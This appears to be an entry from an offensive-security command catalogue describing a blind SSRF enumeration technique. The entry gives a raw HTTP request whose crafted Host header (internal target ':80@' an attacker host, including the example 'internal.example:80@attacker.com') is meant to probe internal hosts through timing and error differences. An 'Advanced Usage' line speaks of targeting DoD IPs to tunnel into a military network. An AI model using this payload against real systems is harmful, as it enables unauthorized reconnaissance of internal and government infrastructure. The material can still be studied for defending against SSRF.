---
data: |-
  GET / HTTP/1.1
  Host: www.██████████:80@████████
  Pragma: no-cache
  Cache-Control: no-cache, no-transform
  Connection: close
tags:
  - blind-ssrf
  - enumeration
type: command
output: SSL errors or DNS timeouts indicating internal connections
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.004Z'
id: 09678c7f-2043-4b17-b84a-b11a249d336a
verified: false
validated: true
submitted: true
---
# blind-ssrf-enumeration

## Command

```http
GET / HTTP/1.1
Host: www.██████████:80@████████
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close
```

## Description

Performs blind SSRF to probe internal hosts using timing and error differences.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host | Internal target via @attacker (e.g., dod-ip:80@attacker.com) | Yes |

## Examples

### Basic Usage

```http
GET / HTTP/1.1
Host: internal.example:80@attacker.com
```

### Advanced Usage

Target specific DoD IPs for tunneling to NIPERNET.

## Expected Output

Indirect indicators like prolonged timeouts for valid hosts.

## Related

- [[commands/ssrf-host-header-get]]
